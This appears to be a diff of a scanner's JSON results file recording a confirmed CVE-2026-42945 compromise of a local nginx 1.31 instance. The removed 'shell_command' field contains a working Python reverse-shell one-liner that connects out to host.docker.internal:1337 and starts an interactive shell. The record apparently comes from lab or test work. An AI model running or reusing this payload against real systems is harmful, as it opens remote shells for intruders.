@@ -1,7 +1,7 @@
 {
   "cve": "CVE-2026-42945",
   "target": "127.0.0.1",
-  "scanned_at": "2026-05-16T19:41:39.997775+00:00",
+  "scanned_at": "2026-05-16T20:01:09.519522+00:00",
   "total_vulnerable": 1,
   "vulnerable": [
     {
@@ -10,8 +10,7 @@
       "status": "confirmed_vulnerable",
       "nginx_version": "1.31",
       "confirmed": true,
-      "shell_peer": "127.0.0.1:48786",
-      "shell_command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"host.docker.internal\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+      "shell_peer": "127.0.0.1:50272"
     }
   ]
 }
